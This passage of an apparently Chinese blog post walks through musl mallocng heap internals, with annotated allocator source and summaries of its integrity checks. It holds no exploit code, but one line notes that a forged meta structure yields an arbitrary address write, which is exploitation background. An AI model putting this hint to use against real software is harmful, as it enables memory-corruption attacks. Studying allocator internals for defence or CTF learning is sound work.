class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span><span class="comment">// metas</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以页为单位分配，是多个 meta 的集合，因此 <code>meta_area_addr = meta_addr &amp; 0xfffffffffffff000</code></p><ul><li><strong>check</strong><ul><li>与 malloc_context 中的 secret 相等，防止伪造 meta</li></ul></li><li><strong>next</strong><ul><li>下一个 meta_area 的地址</li></ul></li><li><strong>nslots</strong><ul><li>meta 槽的数量</li><li>注：在 musl 中 slot 可能指 meta 也可能指 chunk</li></ul></li><li><strong>slots</strong><ul><li>存放多个 meta 结构体，metas</li></ul></li></ul><h3 id="malloc-context"><a href="#malloc-context" class="headerlink" title="malloc_context"></a>malloc_context</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> secret;<span class="comment">// 防止伪造 meta</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line"><span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> init_done;<span class="comment">// 是否初始化的标记</span></span><br><span class="line"><span class="type">unsigned</span> mmap_counter;<span class="comment">// 记录 mmap 出来的 chunk 的数量</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">// 指向 freed_meta 头</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">// 指向 area_areas 中可分配 meta 空间</span></span><br><span class="line"><span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span> <span class="comment">// 分别指向第一个和最后一个 meta_area</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">// 可以分配的 meta 地址，idx 对应着 size_classes 的大小，类似 glibc 的 bins</span></span><br><span class="line"><span class="type">size_t</span> usage_by_class[<span class="number">48</span>];<span class="comment">// idx 对应大小的所有 meta 的 chunk 数量</span></span><br><span class="line"><span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line"><span class="type">uint8_t</span> seq;</span><br><span class="line"><span class="type">uintptr_t</span> brk;<span class="comment">// 记录目前的 brk(0)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>位于 libc 的数据段，为全局结构体</p><ul><li><strong>secret</strong><ul><li>防止伪造 meta</li></ul></li><li><strong>free_meta_head</strong><ul><li>指向 freed_meta 头</li></ul></li><li><strong>avail_meta</strong><ul><li>指向可用 meta 数组</li></ul></li><li><strong>active</strong><ul><li>指向一个 meta 双向链表，其中的 meta 一般都有 unuse_chunk</li><li>idx 对应着 size_classes 的大小，类似 glibc 的 bins</li><li>指向的第一个 meta 一般有 avail_chunk，后面的 meta 一般只有 freed_chunk</li></ul></li><li><strong>usage_by_class</strong><ul><li>idx 对应大小的所有 meta 的 group 管理的 chunk 数量</li></ul></li><li><strong>brk</strong><ul><li>记录目前的 brk(0)</li></ul></li></ul><h3 id="chunk-gt-meta"><a href="#chunk-gt-meta" class="headerlink" title="chunk -&gt; meta"></a>chunk -&gt; meta</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line"><span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> index = get_slot_index(p);</span><br><span class="line"><span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">assert(!offset);</span><br><span class="line">offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  check */</span></span><br><span class="line">assert(meta-&gt;mem == base);</span><br><span class="line">assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">assert(area-&gt;check == ctx.secret);</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>取 chunk 的 idx 和 offset</li><li>通过 offset 取 group</li><li>通过 group-&gt;meta 取 meta</li><li>各种检查<ul><li>meta-&gt;mem == group</li><li>idx &lt;= meta-&gt;last_idx</li><li>meta 的 mask 上 idx 对应的位置是否都为 0</li><li>meta_area-&gt;check == malloc_context.secret</li><li>size_classes[meta-&gt;sizeclass]*(index) &lt;= offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)</li></ul></li></ol><h3 id="大概总结一下"><a href="#大概总结一下" class="headerlink" title="大概总结一下"></a>大概总结一下</h3><ul><li>malloc_context 作为全局变量，在 libc 数据段</li><li>meta_area 作为 meta 的集合，管理着 meta</li><li><strong>同类型</strong> 且 <strong>有可分配 chunk</strong> 的 meta 以双向链表形式连接起来，如果 meta 的 chunk 全部分配出去，则会从双向链表中移出</li><li>malloc 时，通过 malloc_context 的 active 寻找对应大小的可使用的 meta，类似 glibc 的 bins<ul><li>malloc_context 的 active 指向的第一个 meta 一般是有 avail_chunk 或者 freed_chunk（或所有 chunk 刚好分配完），此 meta 后面的 meta 一般只有 freed_chunk</li><li>malloc_context 的 freed_meta_head 指向 freed_meta 链表</li></ul></li></ul><p><img src="/img/Musl_heap_%E6%B5%85%E6%9E%90.assets/Musl_heap_structure.png" alt="Musl heap structure"></p><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><h3 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line"><span class="type">uint32_t</span> mask, first;</span><br><span class="line">    <span class="comment">// sizeclass</span></span><br><span class="line"><span class="type">int</span> sc;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="type">int</span> ctr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mmap 分配</span></span><br><span class="line">    <span class="comment">// #define MMAP_THRESHOLD 131052</span></span><br><span class="line"><span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line"><span class="type">size_t</span> needed = n + IB + UNIT;</span><br><span class="line"><span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">wrlock();</span><br><span class="line">step_seq();</span><br><span class="line">g = alloc_meta();</span><br><span class="line"><span class="keyword">if</span> (!g) &#123;</span><br><span class="line">unlock();</span><br><span class="line">munmap(p, needed);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">g-&gt;mem = p;</span><br><span class="line">g-&gt;mem-&gt;meta = g;</span><br><span class="line">g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">g-&gt;sizeclass = <span class="number">63</span>;</span><br><span class="line">g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line"><span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">ctx.mmap_counter++;</span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据 n 取 size_classes 对应大小的下标</span></span><br><span class="line">sc = size_to_class(n);</span><br><span class="line"></span><br><span class="line">rdlock();</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 寻找合适的 meta */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取对应大小的 meta</span></span><br><span class="line">g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line"><span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line"><span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line"><span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line"><span class="comment">// 7 or 5, the min counts for even size classes.</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果没有对应的 meta，且 4 &lt;= sc &lt; 32 且 sc !=6 且 sc 为偶数 且对应大小的所有 chunk 数量为 0</span></span><br><span class="line"><span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">        <span class="comment">// 使用更大一点（sc+1）的 meta</span></span><br><span class="line"><span class="type">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];</span><br><span class="line"><span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line"><span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果 sc+1 对应的 meta 也不存在或存在但没有可用的 chunk 则 usage+3</span></span><br><span class="line"><span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">    &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">usage += <span class="number">3</span>;</span><br><span class="line">        <span class="comment">// 如果 usage &lt;= 12 则 sc+1</span></span><br><span class="line"><span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">sc |= <span class="number">1</span>;</span><br><span class="line">g = ctx.active[sc];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 寻找可分配的 chunk */</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 取最低位的 1，即取可用的 idx 最小的 chunk，没有则为 0</span></span><br><span class="line">first = mask&amp;-mask;</span><br><span class="line">        <span class="comment">// 若无可用 chunk，则跳出循环</span></span><br><span class="line"><span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 若没有其他问题，则在 avail_mask 中将对应 chunk 的那一 bit 位置零</span></span><br><span class="line"><span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">g-&gt;avail_mask = mask-first;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 计算出对应的 chunk idx</span></span><br><span class="line">idx = a_ctz_32(first);</span><br><span class="line"><span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">upgradelock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果没有合适的 chunk，则进一步分配，获取 chunk 下标</span></span><br><span class="line">idx = alloc_slot(sc, n);</span><br><span class="line"><span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 更新为即将使用的 meta</span></span><br><span class="line">g = ctx.active[sc];</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line">    </span><br><span class="line">success:</span><br><span class="line">ctr = ctx.mmap_counter;</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">return</span> enframe(g, idx, n, ctr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>将 size 转化为对应的 size_classes 的下标 sc</li><li>取 ctx.active[sc] 第一个 meta，取其 avail_mask 中 idx 最小的 chunk</li><li>如果没有则进入 <code>alloc_slot</code> 做进一步分配</li></ol><h3 id="alloc-slot"><a href="#alloc-slot" class="headerlink" title="alloc_slot"></a>alloc_slot</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line"><span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果链表中都没有可用的 chunk，则重新申请一个 group</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line"><span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">g-&gt;avail_mask--;</span><br><span class="line"><span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>进入 <code>try_avail</code> 尝试从 ctx.active[sc] 对应的 meta 链表中寻找可分配的 chunk</li><li>没有则进入 <code>alloc_group</code> 再申请一个 meta 和 group</li></ol><h3 id="try-avail"><a href="#try-avail" class="headerlink" title="try_avail"></a>try_avail</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">try_avail</span><span class="params">(<span class="keyword">struct</span> meta **pm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line"><span class="type">uint32_t</span> first;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">    <span class="comment">// 若没有可分配的 chunk</span></span><br><span class="line"><span class="keyword">if</span> (!mask) &#123;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!m-&gt;freed_mask) &#123;</span><br><span class="line">            <span class="comment">/* 且也没有 freed chunk，即 group 中的 chunk 都是 inuse</span></span><br><span class="line"><span class="comment">               则将该 meta 从 ctx.active[sc] 和 双向链表中移除 */</span></span><br><span class="line">dequeue(pm, m);</span><br><span class="line">m = *pm;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 优先使用下一个 meta 的 freed_chunk</span></span><br><span class="line">m = m-&gt;next;</span><br><span class="line">*pm = m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mask = m-&gt;freed_mask;</span><br><span class="line"></span><br><span class="line"><span class="comment">// skip fully-free group unless it&#x27;s the only one</span></span><br><span class="line"><span class="comment">// or it&#x27;s a permanently non-freeable group</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 跳过所有 chunk 都是 freed_chunk 且可 free 的 meta，一般不会出现这个情况</span></span><br><span class="line"><span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable) &#123;</span><br><span class="line">m = m-&gt;next;</span><br><span class="line">*pm = m;</span><br><span class="line">mask = m-&gt;freed_mask;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line"><span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line"><span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line"><span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">/* 总结起来就是，如果第一个 meta 的 chunk 都是 inuse，</span></span><br><span class="line"><span class="comment">   且第二个 meta 的 freed_chunk 使用完了，才进入下面的操作</span></span><br><span class="line"><span class="comment">   可能是什么特殊情况，正常不会出现这个情况*/</span></span><br><span class="line"><span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>))) &#123;</span><br><span class="line"><span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">m = m-&gt;next;</span><br><span class="line">*pm = m;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line"><span class="type">int</span> span = UNIT + size*cnt;</span><br><span class="line"><span class="comment">// activate up to next 4k boundary</span></span><br><span class="line"><span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) &#123;</span><br><span class="line">cnt++;</span><br><span class="line">span += size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line"><span class="comment">// 将 freed_mask 转为 avail_mask</span></span><br><span class="line">mask = activate_group(m);</span><br><span class="line">assert(mask);</span><br><span class="line">decay_bounces(m-&gt;sizeclass);</span><br><span class="line">&#125;</span><br><span class="line">first = mask&amp;-mask;</span><br><span class="line">m-&gt;avail_mask = mask-first;</span><br><span class="line"><span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>若 active 第一个 meta 的 chunk 都是 inuse，则将此 meta 从 active 和 链表中移出</li><li>将 active 第一个 meta 设置为下一个 meta</li><li>将其 freed_mask 转为 avail_mask 使用</li><li>取 avail_mask 中 idx 最小的 chunk</li></ol><h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">queue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(!m-&gt;next);</span><br><span class="line">assert(!m-&gt;prev);</span><br><span class="line"><span class="keyword">if</span> (*phead) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">head</span> =</span> *phead;</span><br><span class="line">m-&gt;next = head;</span><br><span class="line">m-&gt;prev = head-&gt;prev;</span><br><span class="line">m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">m-&gt;prev = m-&gt;next = m;</span><br><span class="line">*phead = m;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dequeue"><a href="#dequeue" class="headerlink" title="dequeue"></a>dequeue</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/meta.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line"><span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">*phead = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果能够伪造 meta，可以任意地址写</p><h3 id="alloc-group"><a href="#alloc-group" class="headerlink" title="alloc_group"></a>alloc_group</h3><figure class="highlight c"><figcaption><span>./src/malloc/mallocng/malloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 